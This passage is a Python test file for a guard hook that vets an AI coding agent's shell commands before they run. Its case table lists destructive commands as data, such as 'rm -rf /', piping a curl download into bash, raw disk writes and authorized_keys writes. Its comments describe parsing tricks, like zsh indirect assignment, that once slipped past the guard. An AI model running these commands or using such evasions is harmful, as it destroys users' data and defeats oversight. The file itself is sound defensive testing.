#!/usr/bin/env python3
"""Verdicts rm_guard.py must produce, plus the rm-guard.sh wrapper contract.

    python3 test_rm_guard.py

Four outcomes, and the difference between the first two matters:

    pass    the guard stayed silent and normal permissions apply
    allow   the guard looked, proved the target safe, and said so
    ask     confirm first
    deny    refused

cwd is a fixed synthetic path rather than the real one, so a verdict never
depends on where the suite happens to be run from -- safe_roots() folds cwd in,
and a run from /tmp would quietly clear operands a run from $HOME would not.
"""
import json
import os
import shutil
import subprocess
import sys
import tempfile

HERE = os.path.dirname(os.path.abspath(__file__))
GUARD = os.path.join(HERE, "rm_guard.py")
sys.path.insert(0, HERE)
# The only thing imported rather than exercised through the CLI: a literal copy
# here would keep passing after the guard changed the character.
from rm_guard import MARK, proven_bindings  # noqa: E402

WRAPPER = os.path.join(HERE, "rm-guard.sh")
# Deep, absolute, and outside every safe root, so `.` resolves to something
# bounded and /etc still reads as out of bounds.
CWD = "/home/u/project"


def payload(cmd, cwd=CWD):
    return json.dumps({"tool_input": {"command": cmd}, "cwd": cwd})


def run(argv, cmd, cwd=CWD):
    """-> (decision, reason). 'pass' means silence, 'crash' means it died."""
    p = subprocess.run(argv, input=payload(cmd, cwd), capture_output=True, text=True)
    if p.returncode != 0:
        return "crash", p.stderr.strip()
    if not p.stdout.strip():
        return "pass", ""
    try:
        d = json.loads(p.stdout)["hookSpecificOutput"]
    except (ValueError, KeyError) as e:
        return "unparseable", f"{e}: {p.stdout[:200]}"
    return d["permissionDecision"], d["permissionDecisionReason"]


def verdict(cmd, cwd=CWD):
    return run([sys.executable, GUARD], cmd, cwd)


def heredoc(body):
    """The commit form Claude Code writes, which is where this all started."""
    return "git commit -m \"$(cat <<'EOF'\n%s\nEOF\n)\"" % body


# (name, command, expected decision)
CASES = [
    # --- commit messages are prose, not code ---------------------------------
    # A commit message *about* shell commands is indistinguishable from shell
    # commands, and this guard's own history is nothing but such commits.
    ("commit: prose says 'clean'", heredoc("chore: clean up the git hooks"), "pass"),
    ("commit: prose quotes a git clean pipeline",
     heredoc("fix(claude): collapse duplicates\n\n"
             "`git clean -fdxn | head; git clean -fdxn | wc -l` is two segments."), "pass"),
    ("commit: prose quotes rm -rf",
     heredoc("fix: guard against rm -rf \"$W\"/* when W is empty"), "pass"),
    ("commit: prose leaves an odd double quote",
     heredoc('fix(git): quote the "clean flag properly'), "pass"),
    ("commit: plain -m mentioning clean", 'git commit -m "chore: clean up dead code"', "pass"),
    ("commit: plain -m quoting rm -rf",
     'git commit -m "fix: stop rm -rf /tmp/x from firing"', "pass"),
    # shlex rejects $'...' outright; bash has accepted it for thirty years.
    ("commit: ansi-c quoted message", "git commit -m $'fix: clean up\\nsecond line'", "pass"),
    ("commit: --message= form", 'git commit --message="chore: clean up rm -rf handling"', "pass"),
    ("gh pr create --body prose",
     'gh pr create --title "clean up" --body "runs rm -rf on /tmp"', "pass"),
    ("commit -F takes a filename, not prose", "git commit -F /tmp/msg.txt", "pass"),

    # --- heredoc boundaries --------------------------------------------------
    # The terminator rule is bash's: column 0, and only <<- tolerates anything
    # before it, and then only tabs. A loose rule ends the match early and
    # spills the rest of the message back into the scan.
    ("commit: prose contains an indented heredoc example",
     heredoc('fix: strip data\n\n    git commit -m "$(cat <<\'EOF\'\n'
             '    fix: clean up rm -rf handling\n    EOF\n    )"\n\nend of message.'), "pass"),
    ("indented EOF does not terminate, so the rm stays data",
     "cat <<'EOF' > /tmp/f\n  EOF\nrm -rf /\nEOF", "pass"),
    ("code after a column-0 terminator is still code",
     "cat <<'EOF' > /tmp/f\nsome text\nEOF\nrm -rf /", "deny"),
    ("<<- allows a tab-indented terminator",
     "cat <<-'EOF' > /tmp/f\n\tEOF\nrm -rf /etc/x", "ask"),
    # Unquoted <<EOF expands, so its body is deliberately NOT stripped. A
    # literal `rm -rf /` in there is still only data the shell writes to a file,
    # so this deny is a known false positive: conservative, and the safe way to
    # be wrong.
    ("unquoted heredoc body is left in the scan",
     "cat <<EOF > /tmp/f\nrm -rf /\nEOF", "deny"),
    # Every case above reaches the guard through heredoc(), whose
    # "$(cat <<'EOF' ...)" wrapper masks the body as a substitution -- which hid
    # this for as long as the suite existed. A BARE heredoc is what
    # `git commit -F -` takes, and nothing masked its body before shlex read it.
    # Prose is not shell: the apostrophe in "the guard's" is an unterminated
    # quote, and the parse failure came back as the verdict.
    ("commit: bare heredoc body with an apostrophe",
     "git commit -q -F - <<'EOF'\ndocs: plan the guard's binding pass\nEOF\n"
     'git log --oneline -2 && echo "clean"', "pass"),
    # The cost was never only the prompt. A parse failure REPLACES the analysis,
    # so a real catastrophe after the terminator reported as a vague ask.
    ("bare heredoc prose, then a real rm",
     "cat <<'EOF' > /tmp/f\ndocs: the guard's pass\nEOF\nrm -rf /", "deny"),

    # --- a newline separates statements, exactly as ; does -------------------
    # shlex consumes a newline as whitespace, so no token is ever equal to one
    # and SEPARATORS listed "\n" against nothing. Two statements on two lines
    # were therefore ONE segment, and git_segments() exempts a whole segment
    # whose command word is git -- so a real rm on the next line was skipped as
    # git's business, and only the RM_RECURSIVE_RE fallback caught it.
    ("newline does not extend git's exemption",
     'git commit -m "wip"\nrm -rf /', "deny"),
    # ...and the same confusion in the other direction: a provably safe target
    # could not be proven, because the rm it belonged to was never scanned.
    ("newline does not hide a provable target",
     "git log --oneline\nrm -rf /tmp/build/out", "allow"),
    # bash DELETES a backslash-newline. shlex with posix=True instead hands back
    # a literal newline glued to whatever followed, so this arrived as the
    # operand "\n/", which posixpath.isabs() calls relative -- so it read as a
    # bounded relative path and the guard ALLOWED rm -rf /. Only the second
    # command in this file's history that it actively approved rather than missed.
    ("line continuation before the filesystem root", "rm -rf \\\n/", "deny"),
    ("line continuation before a safe path",
     "rm -rf \\\n/tmp/build/out", "allow"),
    # Inside single quotes a backslash is literal and there is no continuation,
    # so both characters belong to the filename and must survive.
    ("no continuation inside single quotes",
     "rm -rf '/tmp/build/a\\\nb'", "allow"),

    # shlex's commenters default to `#`, and on reaching one it reads to the end
    # of the LINE -- but the arm above turned every newline into ";", so there
    # was no line end left and a comment swallowed every statement after it.
    # These three came back *allow*, with the real rm never tokenized.
    ("a comment does not hide the next statement",
     "rm -rf ./build # tidy up\nrm -rf /", "deny"),
    # ...and bash starts a comment only at a word boundary, so this `#` is part
    # of a filename; shlex cut the word there regardless.
    ("a mid-word # is a filename, not a comment",
     "rm -rf ./build#x\nrm -rf /", "deny"),
    ("a comment does not hide --no-preserve-root",
     "rm -rf ./build # x\nrm -rf --no-preserve-root /", "deny"),
    # ...while a quoted # is data in both shells and must survive.
    ("a # inside double quotes is not a comment",
     'echo "a # b"; rm -rf /tmp/x', "allow"),
    ("a # inside single quotes belongs to the filename",
     "rm -rf '/tmp/a#b'", "allow"),
    ("a comment before a real rm still reaches it",
     "git status # note\nrm -rf /", "deny"),

    # --- a message argument must not shield a real command -------------------
    ("commit then a real rm", 'git commit -m "chore: clean up" && rm -rf /', "deny"),
    ("commit then a real git clean", 'git commit -m "wip" && git clean -fdx', "ask"),
    ("commit then an rm of $HOME", 'git commit -m "clean" ; rm -rf "$HOME"', "deny"),

    # --- unreadable text asks only when something destructive is in play -----
    ("unparseable with a recursive rm", 'rm -rf "/tmp/a && rm -rf $W/*', "ask"),
    ("unparseable and harmless", 'echo "unbalanced && git log', "pass"),

    # --- core behaviour, which none of the above may disturb -----------------
    ("rm -rf the filesystem root", "rm -rf /", "deny"),
    ("rm -rf $HOME", 'rm -rf "$HOME"', "deny"),
    ("rm -rf unguarded expansion with a suffix", 'rm -rf "$W"/*', "ask"),
    ("rm -rf ${VAR:?}-guarded", 'rm -rf "${W:?}"/*', "allow"),
    ("rm -rf under a safe root", "rm -rf /tmp/build/out", "allow"),
    ("rm -rf outside every safe root", "rm -rf /etc/foo", "ask"),
    ("rm without -r cannot descend", "rm /etc/passwd", "pass"),
    ("git rm is out of scope", "git rm -r src/", "pass"),
    ("find -delete", "find /etc -name '*.log' -delete", "ask"),
    ("fd -X rm", "fd -e log -X rm -rf /etc", "ask"),
    ("rsync --delete prunes the destination", "rsync -a --delete /src/ /etc/dst/", "ask"),
    ("rclone sync", "rclone sync /src remote:bucket", "ask"),
    ("git clean -fdx", "git clean -fdx", "ask"),
    ("ssh runs it on the far end", "ssh box 'rm -rf /var/data'", "ask"),
    ("eval hides its arguments", 'eval "rm -rf $X/*"', "ask"),
    ("--no-preserve-root", "rm -rf --no-preserve-root /", "deny"),
    ("substitution next to an rm", 'rm -rf "$(cat targets.txt)"', "ask"),
    ("ls piped to a non-recursive rm", "ls | xargs rm", "pass"),
    ("docker run --rm is not rm", "docker run --rm -it ubuntu", "pass"),
    ("jq -r is not a recursion flag", "jq -r . file.json", "pass"),
    ("prose that merely mentions rm", 'echo "did my rm get logged?"', "pass"),

    # --- command substitution ------------------------------------------------
    # Masked before tokenizing. Without that, shlex splits on ( and ) and the
    # first case here comes back *allow*: four shards that each read as a
    # literal relative path. It is the one case in this file where the guard
    # actively approved a catastrophe rather than merely missing it.
    ("unquoted substitution shatters under shlex", "rm -rf $(cat list)", "ask"),
    ("quoted substitution", 'rm -rf "$(pwd)/build"', "ask"),
    ("backtick substitution", "rm -rf `pwd`/x", "ask"),
    ("nested substitution", "rm -rf $(dirname $(pwd))/x", "ask"),
    # Adjacency is the reason for masking rather than re-joining tokens: split
    # here, `/b` reads as an absolute path and `$(pwd)` as a separate operand,
    # and neither is what runs.
    ("substitution keeps its literal suffix", "rm -rf $(pwd)/b", "ask"),
    # Two things no operand check can see.
    ("substitution in command position", "$(echo rm) -rf /", "ask"),
    ("substitution in command position behind a wrapper",
     "sudo $(echo rm) -rf /", "ask"),
    ("substitution may expand to -rf", "rm $(echo -rf) /tmp/x", "ask"),
    # ...and the case the old blanket bail-out got wrong: a substitution in a
    # segment that destroys nothing, next to an rm whose target is provable.
    ("substitution in an unrelated segment", "echo $(date) && rm -rf ./build", "allow"),
    ("substitution with no destructive command anywhere", "echo $(date)", "pass"),

    # A quoted assignment word proves nothing -- see BINDING_CASES. Passes
    # today because nothing consumes bindings yet; it is here so wiring them
    # into the classifier cannot turn this into an allow.
    ("quoted assignment word proves nothing",
     "'W=/tmp/build'; rm -rf \"$W\"/*", "ask"),
    # ...and an earlier real assignment to the same name must not vouch for it.
    ("earlier assignment does not vouch for a quoted one",
     "W=/tmp/ok; 'W=/tmp/evil'; rm -rf \"$W\"/*", "ask"),
    # An escaped separator keeps the assignment in ONE token; a scanner that
    # splits there shifts every later index onto an earlier fragment.
    ("escaped separator does not shift the binding scan",
     "A=x\\;W=/tmp/ok; 'W=/tmp/evil'; rm -rf \"$W\"/*", "ask"),
    # A wrapper hides eval from the command-position bail, and the mention rule
    # cannot see a rebinding that never names its target. Nothing consumes the
    # binding map yet, so this and a plain unprovable "$W"/* land on the same
    # "ask" either way -- it is forward-looking, not a pin on this fix, and it
    # only starts discriminating once the classifier is wired to the map.
    ("eval behind a wrapper can rebind without naming it",
     'W=/tmp/x; command eval "$C"; rm -rf "$W"/*', "ask"),

    # --- a binding condemns from anywhere, and clears behind a gate ----------
    # proven_bindings produced six wrong-`allow` defects across six review
    # rounds, every one a stale binding trusted to prove safety. Condemning
    # tolerates that -- a stale binding costs a missed deny, a prompt. Clearing
    # does not, so it additionally requires _rebinding_possible to find nothing
    # ahead of the delete; the rows under "clearing is gated" below pin that.
    ("binding escalates a fatal literal", 'W=/; rm -rf "$W"/*', "deny"),
    ("binding clears a safe literal",
     'W=/tmp/build; rm -rf "$W"/*', "allow"),
    ("binding does not clear an out-of-bounds literal",
     'W=/etc; rm -rf "$W"/*', "ask"),
    # The resolved path is judged like any other, so where it lands is what
    # decides it -- not the mere fact that a binding was found.
    ("binding clears only as deep as the path earns",
     'W=/tmp; rm -rf "$W"/*', "ask"),
    ("binding escalates through the find arm", 'W=/; find "$W" -delete', "deny"),
    # A bare expansion with no suffix normally clears, on the grounds that an
    # empty one makes `rm -rf ""` -- an error, not a catastrophe. The escalation
    # sits ahead of that heuristic, so a binding proven fatal overrides it.
    ("binding escalates a bare operand too", 'W=/; rm -rf "$W"', "deny"),
    # --- brace expansion -----------------------------------------------------
    # Bash expands braces before anything else, and each product is its own
    # word. Not doing so was the only wrong-`allow` here that needed no variable
    # at all: with no leading slash the whole token read as one bounded relative
    # path, so `allow` came back for a command that deletes the root. Verified
    # against bash: `{/,/etc}` expands to `/ /etc`.
    ("brace group hides the filesystem root", "rm -rf {/,/etc}", "deny"),
    ("brace group escapes a safe root via ..", "rm -rf /tmp/{../etc,x}", "ask"),
    ("brace group with no common prefix", "rm -rf {/etc,/tmp/x}", "ask"),
    ("a numeric range expands too", "rm -rf /{1..3}", "ask"),
    # ...and the products that are all fine must still clear, or expanding
    # braces would just be a new way to prompt.
    ("brace products under a safe root", "rm -rf /tmp/build/{a,b}", "allow"),
    ("brace products under cwd", "rm -rf ./build/{a,b}", "allow"),
    # `{}` is find's placeholder and `{a}` a filename: one alternative is not an
    # expansion, and treating it as one would rewrite operands that never change.
    ("find's {} placeholder is not an expansion",
     "find /tmp/build -name x -exec rm -rf {} +", "allow"),
    ("a ${VAR:?} brace is not an expansion", 'rm -rf "${W:?}"/*', "allow"),

    # --- a loop binds its variable, so the bare-expansion allow is void -------
    # `bare $f is safe because empty makes rm -rf ""` holds only while nothing
    # says what $f is. A loop says exactly that, in the same command.
    ("for-loop over dangerous literals",
     'for f in /etc /var; do rm -rf "$f"; done', "ask"),
    ("for-loop over the filesystem root", 'for f in /; do rm -rf "$f"; done', "deny"),
    # The list is complete and visible, so it clears as well as condemns -- a
    # loop over safe literals must not start costing a prompt.
    ("for-loop over safe literals",
     'for d in build dist; do rm -rf "$d"; done', "allow"),
    # ...and a value from outside the command is not knowable at all.
    ("while-read binds from stdin", 'while read f; do rm -rf "$f"; done < l', "ask"),
    ("for-loop over a substitution", 'for f in $(cat l); do rm -rf "$f"; done', "ask"),
    ("for-loop over a glob", 'for f in /etc/*; do rm -rf "$f"; done', "ask"),

    # --- cd moves what a relative operand means ------------------------------
    ("cd to the root makes a relative operand fatal", "cd /; rm -rf build", "deny"),
    ("...conditionally, too", "cd / && rm -rf build", "deny"),
    ("...inside a subshell", "(cd /; rm -rf build)", "deny"),
    ("...and inside a loop body", "for x in a; do cd /; rm -rf build; done", "deny"),
    ("an unreadable cd target leaves the operand unplaceable",
     'cd "$D"; rm -rf ./build', "ask"),
    ("a cd to a deep literal still clears", "cd /tmp/build && rm -rf ./sub", "allow"),

    # --- the operand that IS the working directory ---------------------------
    # A named subdirectory is bounded wherever you stand. `.` is not: it takes
    # the whole tree you are in, which is a different thing to agree to.
    ("rm -rf . takes everything under cwd", "rm -rf .", "ask"),
    ("...and so does ./", "rm -rf ./", "ask"),
    ("...and so does ./*", "rm -rf ./*", "ask"),
    ("...and so does find . -delete", "find . -delete", "ask"),
    ("a named subdirectory is still bounded", "rm -rf ./build", "allow"),
    ("...including several of them", "rm -rf build dist .next", "allow"),

    # --- a wrapper's own option must not swallow the command word ------------
    # command_word steps over wrappers one token at a time, so `-u` stopped the
    # walk and the find behind it was never analysed. rm never had this problem
    # because it is scanned across every token; nothing else was.
    ("sudo with an option argument", "sudo -u root find / -delete", "deny"),
    ("nice with an option argument", "nice -n 5 find / -delete", "deny"),
    ("timeout is not even a known wrapper", "timeout 5 find / -delete", "deny"),
    ("ionice with option arguments", "ionice -c3 -n7 find / -delete", "deny"),
    ("...and the same for the other guarded commands",
     "timeout 5 rsync -a --delete /src/ /etc/dst/", "ask"),
    ("...including git", "sudo -u root git clean -fdx", "ask"),

    # --- fd's search roots ---------------------------------------------------
    # --search-path was in the value-option set, so its value was discarded and
    # roots fell back to ".": a walk of the whole filesystem came back allow.
    ("fd --search-path names the root", "fd --search-path / -x rm", "deny"),
    ("...in its = form too", "fd --search-path=/ -x rm", "deny"),
    ("fd -C names the base directory", "fd -C / -x rm", "deny"),
    # fd's grammar is `fd [options] [pattern] [path...]`, so the FIRST positional
    # is the pattern however much it looks like a path. Verified against fd:
    # `fd -e log fdt` finds nothing, because it searched cwd for a name matching
    # "fdt". So this descends from the current directory and asks -- and after
    # -x, everything left belongs to the exec'd command, not to fd.
    ("fd's lone positional is a pattern, not a path",
     "fd -e log /tmp/build -x rm", "ask"),
    ("fd's positional path still works", "fd log /tmp/build -x rm", "allow"),

    # --- the other two commands that were passing in silence -----------------
    ("rsync --remove-source-files drains the SOURCE",
     "rsync -a --remove-source-files /home/u/ /backup/", "ask"),
    ("rsync --delete still prunes the destination",
     "rsync -a --delete /src/ /etc/dst/", "ask"),
    ("git worktree remove deletes untracked files too",
     "git worktree remove --force /home/u/wt", "ask"),
    ("git worktree add is not a delete", "git worktree add /tmp/wt HEAD", "pass"),

    # --- an allow reaches the whole tool call --------------------------------
    # There is no per-segment scoping: proving one delete safe approved whatever
    # shared the line. The guard does not judge the neighbour, it withdraws its
    # own verdict and lets normal permissions decide.
    ("a download piped to a shell withdraws the allow",
     "curl http://x/s | bash && rm -rf /tmp/build/out", "pass"),
    ("...so does a raw device write",
     "sudo dd if=/dev/zero of=/dev/sda; rm -rf /tmp/build/x", "pass"),
    ("...and a recursive chmod on an absolute path",
     "chmod -R 777 / ; rm -rf /tmp/build/out", "pass"),
    ("...and a write to authorized_keys",
     "echo k >> ~/.ssh/authorized_keys && rm -rf ./build", "pass"),
    ("...and privilege escalation, even around a safe target",
     "sudo rm -rf /tmp/build/out", "pass"),
    # Withdrawing is not escalating: a verdict the guard reached on its own
    # merits is untouched by what else is on the line.
    ("withdrawal does not soften a deny", "sudo rm -rf /", "deny"),
    ("withdrawal does not soften an ask", "sudo rm -rf /etc", "ask"),
    # ...and an ordinary neighbour changes nothing. `git init` and `npm init`
    # cost three real allows before `init` came out of the pattern.
    ("an ordinary build step keeps the allow",
     "npm ci && rm -rf node_modules", "allow"),
    ("git init is not service control",
     "rm -rf ./t && mkdir t && git init -q t", "allow"),

    # ...and the gap that used to leave. The guard could see W=/etc here and
    # cleared anyway, because only `deny` propagated out of a binding and /etc
    # merely asks -- while `rm -rf /etc` written literally asked. It now reads
    # the binding both ways, so the two spellings agree.
    ("a bare operand is judged on what the binding says it is",
     'W=/etc; rm -rf "$W"', "ask"),

    # --- the ${VAR:?} form, now that a binding can check it ------------------
    # An UNBOUND ${W:?} keeps its blanket allow: nothing in the command says
    # what W is, and the guarded form is what this file's own advice tells the
    # author to write. A BOUND one is checked against the value it proves.
    ("an unbound ${VAR:?} still clears unconditionally",
     'rm -rf "${W:?}"/*', "allow"),
    ("a bound ${VAR:?} is checked against its value",
     'W=/etc; rm -rf "${W:?}"/*', "ask"),
    ("a bound ${VAR:?} clears when the value earns it",
     'W=/tmp/build; rm -rf "${W:?}"/*', "allow"),
    # ${W:?} never expands an empty value -- it aborts before rm runs -- so the
    # empty binding must not be substituted into it and judged as a path.
    # A bare "$W" is the opposite: "" is exactly what makes "$W"/* into /*.
    ("an empty binding cannot promote a guarded form",
     'W=; rm -rf "${W:?}"/*', "allow"),
    ("an empty binding still condemns the bare form",
     'W=; rm -rf "$W"/*', "deny"),
    ("an empty binding does not mis-deny a harmless error-out",
     'W=; rm -rf "$W"', "allow"),

    # --- clearing is gated on nothing being able to rebind namelessly --------
    # Each of these resolves to a path that would otherwise clear. What stops
    # them is _rebinding_possible: proven_bindings drops any name whose later
    # mentions are more than plain reads, so what is left to fence off is a
    # rebinding whose target name never appears as text at all.
    ("a function definition withdraws clearing",
     'W=/tmp/build; f() { :; }; f; rm -rf "$W"/*', "ask"),
    ("a builtin that can compute a name withdraws clearing",
     'W=/tmp/build; declare -g "$(printf X)=/"; rm -rf "$W"/*', "ask"),
    ("zsh's set -A withdraws clearing",
     'W=/tmp/build; set -A arr a b; rm -rf "$W"/*', "ask"),
    ("plain set flags do not withdraw clearing",
     'W=/tmp/build; set -euo pipefail; rm -rf "$W"/*', "allow"),
    # Position, not presence. A builtin downstream of the delete cannot have run
    # before it -- which is every hit in this machine's corpus.
    ("a rebinding after the delete does not withdraw clearing",
     'W=/tmp/build; rm -rf "$W"/*; declare -g "$(printf X)=/"', "allow"),
    # ...except in a loop body, which runs again. Here `g` follows the rm in the
    # text and precedes it in time on the second iteration.
    ("a loop body voids the ordering",
     'W=/tmp/build; for i in 1 2; do rm -rf "$W"/*; g() { :; }; done', "ask"),
    # A loop that opens after the delete has no such claim on it.
    ("a loop after the delete does not void it",
     'W=/tmp/build; rm -rf "$W"/*; for f in a b; do printf "%s" "$f"; done',
     "allow"),
    # A builtin's name in somebody's ARGUMENT runs nothing. Reading one as code
    # cost a real allow in the corpus, on an echo whose title said "no trap
    # backup".
    ("a builtin named in prose is not a rebinding",
     'W=/tmp/build; echo "no trap backup"; rm -rf "$W"/*', "allow"),

    # --- the bypass this gate shipped with, found in review ------------------
    # zsh's ${(P)ptr::=value} assigns to the parameter NAMED BY ptr, as an
    # ARGUMENT to `:` -- no command word, and W is never written. It cleared as
    # /tmp/build/* and ran as `rm -rf /etc/*`; the empty form ran as
    # `rm -rf /*`. Pinned in both the value-carrying and the empty shape,
    # because they fail differently and only the second is the wipe.
    ("a zsh indirect assignment withdraws clearing",
     'W=/tmp/build; PTR=W; : ${(P)PTR::=/etc}; rm -rf "$W"/*', "ask"),
    ("...including the form that empties the variable",
     'W=/tmp/build; PTR=W; : ${(P)PTR::=}; rm -rf "$W"/*', "ask"),
    # Matched on raw text, so a second flag letter cannot slip past a rule
    # written against the exact string `(P)`. NOTE this row alone does not
    # isolate the flag-list half -- `::=` satisfies the rule by itself -- which
    # is what the two rows after it are for.
    ("...and is not defeated by another expansion flag",
     'W=/tmp/build; PTR=W; : ${(PP)PTR::=/etc}; rm -rf "$W"/*', "ask"),
    # One row per half of ASSIGNING_EXPANSION_RE, so neither can be deleted in
    # silence. `${(P)PTR:=/etc}` carries a flag list and no `::=`; `${PTR::=x}`
    # carries `::=` and no flag list.
    ("the flag-list half stands alone",
     'W=/tmp/b; PTR=W; : ${(P)PTR:=/etc}; rm -rf "$W"/*', "ask"),
    ("...and so does the always-assign half",
     'W=/tmp/b; : ${PTR::=/etc}; rm -rf "$W"/*', "ask"),

    # --- precommand modifiers, which run IN this shell -----------------------
    # Every one of these came back `allow` and runs as `rm -rf //*`. The first
    # three are zsh precommand modifiers that were missing from WRAPPERS, so
    # command_word stopped on them and the typeset behind them was never in
    # command position. `builtin` was, word for word, the wrapper the gate's
    # docstring claimed could not hide one.
    ("builtin does not hide a rebinding builtin",
     'W=/tmp/b; builtin typeset -g "$(printf X)=/"; rm -rf "$W"/*', "ask"),
    ("noglob does not hide one",
     'W=/tmp/b; noglob typeset -g "$(printf X)=/"; rm -rf "$W"/*', "ask"),
    ("nocorrect does not hide one",
     'W=/tmp/b; nocorrect typeset -g "$(printf X)=/"; rm -rf "$W"/*', "ask"),
    # shlex splits `2>/dev/null` into three tokens, so command_word stopped on
    # the bare fd digit `2` and never reached the typeset.
    ("a leading redirection does not hide one",
     'W=/tmp/b; 2>/dev/null typeset -g "$(printf X)=/"; rm -rf "$W"/*', "ask"),
    ("...nor one without an fd digit",
     'W=/tmp/b; >/dev/null typeset -g "$(printf X)=/"; rm -rf "$W"/*', "ask"),
    # The wrapper-stepping half of the same rule: in_cmd_pos is built with
    # command_word, not "first token of the segment".
    ("a wrapper does not hide one either",
     'W=/tmp/b; command typeset -g "$(printf X)=/"; rm -rf "$W"/*', "ask"),

    # --- the loop stack, in both directions ----------------------------------
    # repeat/do/done and foreach/end are zsh loops the stack never opened, so a
    # rebinding in the body read as "after the delete" and cleared it.
    ("repeat is a loop",
     'W=/tmp/b; repeat 2; do rm -rf "$W"/*; typeset -g "$(printf X)=/"; done',
     "ask"),
    ("foreach ... end is a loop",
     'W=/tmp/b\nforeach i (1 2)\nrm -rf "$W"/*\ntypeset -g "$(printf X)=/"\nend',
     "ask"),
    # A closer counts only in command position. A `done` in a word list, or an
    # `echo done` in a body, was popping a genuinely open loop -- the direction
    # that costs a filesystem, unlike a stray opener, which only costs a prompt.
    ("`done` in a word list does not close the loop",
     'W=/tmp/b; for i in a done; do rm -rf "$W"/*; typeset -g "$(printf X)=/"; done',
     "ask"),
    ("`echo done` in a body does not close it",
     'W=/tmp/b; for i in 1 2; do echo done; rm -rf "$W"/*; typeset -g "$(printf X)=/"; done',
     "ask"),
    # ...and the loop rule still must not fire on a loop that never contained
    # the delete, which is what the blunt first version got wrong.
    ("a loop after the delete still clears",
     'W=/tmp/b; rm -rf "$W"/*; for f in a b; do echo "$f"; done', "allow"),

    # --- the rest of REBINDING_BUILTINS --------------------------------------
    # One row per entry. The set has fourteen and had one, so thirteen could
    # have been deleted in silence -- and a comment here previously claimed they
    # were pinned when only four were. trap and autoload each earn a paragraph
    # of justification in the source and now cost a test to remove.
    ("typeset withdraws clearing",
     'W=/tmp/b; typeset -g "$(printf X)=/"; rm -rf "$W"/*', "ask"),
    ("trap withdraws clearing",
     'W=/tmp/b; trap "$(printf X)=/" EXIT; rm -rf "$W"/*', "ask"),
    ("autoload withdraws clearing",
     'W=/tmp/b; autoload -Uz f; f; rm -rf "$W"/*', "ask"),
    ("local withdraws clearing",
     'W=/tmp/b; local "$(printf X)=/"; rm -rf "$W"/*', "ask"),
    ("export withdraws clearing",
     'W=/tmp/b; export "$(printf X)=/"; rm -rf "$W"/*', "ask"),
    ("readonly withdraws clearing",
     'W=/tmp/b; readonly "$(printf X)=/"; rm -rf "$W"/*', "ask"),
    ("printf withdraws clearing",
     'W=/tmp/b; printf "$(printf X)=/"; rm -rf "$W"/*', "ask"),
    ("read withdraws clearing",
     'W=/tmp/b; read "$(printf X)=/"; rm -rf "$W"/*', "ask"),
    ("mapfile withdraws clearing",
     'W=/tmp/b; mapfile "$(printf X)=/"; rm -rf "$W"/*', "ask"),
    ("readarray withdraws clearing",
     'W=/tmp/b; readarray "$(printf X)=/"; rm -rf "$W"/*', "ask"),
    ("getopts withdraws clearing",
     'W=/tmp/b; getopts "$(printf X)=/"; rm -rf "$W"/*', "ask"),
    ("let withdraws clearing",
     'W=/tmp/b; let "$(printf X)=/"; rm -rf "$W"/*', "ask"),
    ("unset withdraws clearing",
     'W=/tmp/b; unset "$(printf X)=/"; rm -rf "$W"/*', "ask"),

    # --- may_clear actually reaches the other arms ---------------------------
    # The thread into analyse_segment had no coverage at all: hard-coding it to
    # False disabled clearing for find/fd/rsync/rclone/git and the suite stayed
    # green. These pin both directions.
    ("a binding clears through the find arm",
     'W=/tmp/b; find "$W" -delete', "allow"),
    ("...and is gated there too",
     'W=/tmp/b; typeset -g "$(printf X)=/"; find "$W" -delete', "ask"),
    ("a binding clears through the rclone arm",
     'W=/tmp/b; rclone purge "$W"', "allow"),
    # ...and into the loop block's recursion, where a loop variable and a bound
    # one meet in one operand. This is the shape of a real corpus command.
    ("a loop variable and a binding compose",
     'W=/tmp/b; for m in x y; do rm -rf "$W"/$m; done', "allow"),

    # --- round 2: the redirect fix was an enumeration, and lost --------------
    # REDIRECTS lists eight operators; zsh has more, and every one it omits was
    # a leading redirection command_word stopped on, reporting the OPERATOR as
    # the command and hiding the typeset behind it. Each returned `allow` on a
    # command that runs as `rm -rf //b`. Recognised by shape now, not by list.
    ("a herestring does not hide a rebinding builtin",
     'W=/tmp/b; <<<x typeset -g "$(printf X)=/"; rm -rf "$W"/c', "ask"),
    ("nor a clobbering redirect",
     'W=/tmp/b; >|/tmp/zz typeset -g "$(printf X)=/"; rm -rf "$W"/c', "ask"),
    ("nor a read-write redirect",
     'W=/tmp/b; <>/tmp/zz typeset -g "$(printf X)=/"; rm -rf "$W"/c', "ask"),
    ("nor an &> redirect",
     'W=/tmp/b; &>/tmp/zz typeset -g "$(printf X)=/"; rm -rf "$W"/c', "ask"),
    ("nor an &>> redirect",
     'W=/tmp/b; &>>/tmp/zz typeset -g "$(printf X)=/"; rm -rf "$W"/c', "ask"),

    # The backstop for the operator the shape rule does not anticipate either.
    # A command word that cannot be a command name means the parse failed, and
    # clearing must not rest on a failed parse -- which is exactly how the two
    # enumerations above each produced a wrong allow rather than a prompt.
    ("an unidentifiable command word withdraws clearing",
     'W=/tmp/b; %% typeset -g "$(printf X)=/"; rm -rf "$W"/c', "ask"),
    # ...but punctuation that IS a command name is identified, not refused.
    # `[ -z "$f" ]` appears in two real corpus commands and cost both allows
    # when the backstop was written as "has no word character".
    ("[ is a command, not an unidentifiable word",
     'W=/tmp/b; [ -z "$x" ] && rm -rf "$W"/*', "allow"),
    ("...and so is the no-op",
     'W=/tmp/b; : ; rm -rf "$W"/*', "allow"),
    # The rows above pass with or without REDIRECT_TOKEN_RE, because the
    # backstop refuses an unparsed operator either way. These are what the
    # shape rule is actually FOR: the backstop withholds an allow, and parsing
    # the redirect correctly is what gives it back when nothing behind it can
    # rebind. Without the shape rule these three ask.
    ("a harmless command behind a herestring still clears",
     'W=/tmp/b; <<<x cat; rm -rf "$W"/*', "allow"),
    ("...behind an &> redirect",
     'W=/tmp/b; &>/tmp/zz echo hi; rm -rf "$W"/*', "allow"),
    ("...and behind a plain fd redirect",
     'W=/tmp/b; 2>/dev/null echo hi; rm -rf "$W"/*', "allow"),

    # --- round 2, second pass: bash forms zsh rejects outright ---------------
    # Neither of these runs under zsh (parse error), so neither is reachable
    # from the Bash tool today. Both are pinned anyway: which shell runs the
    # command is a measured fact about this machine, not a property of the
    # guard, and both fixes only ever withhold an allow.
    #
    # bash's `{fd}>file` names a variable to take the descriptor. shlex emits
    # `{fd}` alone, and it has word characters, so it passed the backstop --
    # which refuses a command word that cannot be a NAME, and `{fd}` looks like
    # one.
    ("{fd}> does not hide a rebinding builtin",
     'W=/tmp/b; {fd}>out typeset -g "$(printf X)=/"; rm -rf "$W"/*', "ask"),
    ("nor {fd}<",
